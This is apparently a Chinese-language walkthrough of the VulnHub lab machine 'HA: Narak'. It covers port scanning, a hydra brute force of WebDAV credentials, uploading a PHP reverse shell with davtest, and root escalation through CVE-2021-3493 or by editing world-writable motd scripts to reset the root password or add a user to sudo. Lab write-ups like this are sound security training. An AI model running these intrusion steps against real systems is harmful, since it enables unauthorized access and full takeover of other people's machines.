靶机地址：[HA: Narak ~ VulnHub](https://www.vulnhub.com/entry/ha-narak,569/)
需要先配置网络：GRUB选项下按e进入编辑模式，改为单用户启动模式
```
	linux    /vmlinuz-5.4.0-72-generic root=/dev/mapper/ubuntu--\
vg-ubuntu--lv rw single init=/bin/bash
```
按 `Ctrl+x` 或 `F10` 启动
查看网卡名
```Shell
ip a
# enp0s17
```
编辑网络配置文件
```Shell
vi /etc/network/interfaces
# 或
vi /etc/netplan/0x-xx-xx.yaml
```
将网卡名修改为正确的后重启机器即可

主机发现、端口扫描、服务枚举
```Shell
sudo arp-scan -l
sudo nmap -p- 192.168.1.47
sudo nmap -p "22,80" -sV 192.168.1.47
# 22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
# 80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
```
简单看了下web服务，没发现什么特别的，路径扫描一下
```Shell
sudo dirsearch -u http://192.168.1.47
# /webdav/index.html
```
尝试访问 `/webdav/index.html` ，需要身份认证
进一步路径扫描，收集更多信息
```Shell
sudo dirsearch -u http://192.168.1.47 -f -e html,txt,php -w /usr/share/dirb/wordlists/common.txt
# /tips.txt
```
提示内容如下
```
Hint to open the door of narak can be found in creds.txt.
```
但是找不到这个文件，这个信息没什么用
定制字典文件
```Shell
cewl 192.168.1.47 -w wl.txt
```
用户名和密码都使用定制字典进行暴力破解
```Shell
hydra -L wl.txt -P wl.txt http-get://192.168.1.47/webdav/index.html
# [80][http-get] host: 192.168.1.47   login: yamdoot   password: Swarg
```
webdav测试
```Shell
davtest -url "http://192.168.1.47/webdav/" -auth "yamdoot:Swarg"
```
上传都成功了，PHP可以被解析
手动上传一个PHP的反弹shell脚本
```Shell
davtest -url "http://192.168.1.47/webdav/" -auth "yamdoot:Swarg" -uploadfile php-reverse-shell.php -uploadloc rs.php
```
上传成功，访问一下，获取到反弹shell
信息收集，存在如下几个用户
```
root:x:0:0:root:/root:/bin/bash
narak:x:1000:1000:narak,,,:/home/narak:/bin/bash
yamdoot:x:1001:1001:,,,:/home/yamdoot:/bin/bash
inferno:x:1002:1002:,,,:/home/inferno:/bin/bash
```
在narak的主目录下发现 `user.txt` 里面有一个flag
尝试提权，使用 [[20 CVE#CVE-2021-3493|CVE-2021-3493]] 成功提权

其它提权方式
```Shell
find / -user root -type f -perm -o=rwx 2>/dev/null
# /mnt/hell.sh
cat /mnt/hell.sh
# echo"Highway to Hell";
# --[----->+<]>---.+++++.+.+++++++++++.--.+++[->+++<]>++.++++++.--[--->+<]>--.-----.++++.
```
这是一串Brain Fuck语言，将内容写入 `bf.txt`
```Shell
brainfuck bf.txt
# chitragupt
```
尝试SSH
```Shell
ssh narak@192.168.1.47
# Permission denied, please try again.
ssh yamdoot@192.168.1.47
# Permission denied, please try again.
ssh inferno@192.168.1.47
# Welcome to Ubuntu 18.04 LTS (GNU/Linux 4.15.0-20-generic x86_64)
```
`inferno` 登录成功，尝试提权
```Shell
find / -user root -type f -perm -o=rwx 2>/dev/null
```
输出如下
```
/mnt/hell.sh
/etc/update-motd.d/91-release-upgrade
/etc/update-motd.d/00-header
/etc/update-motd.d/50-motd-news
/etc/update-motd.d/80-esm
/etc/update-motd.d/80-livepatch
/etc/update-motd.d/10-help-text
```
编辑一个文件，如 `vi /etc/update-motd.d/00-header` ，其实都是shell脚本，加入如下内容
```Shell
# 改root密码
echo 'root:33334444' | chpasswd
# 或
# 将当前用户加入sudo组 前提得知道登录密码
usermod -a -G sudo inferno
```
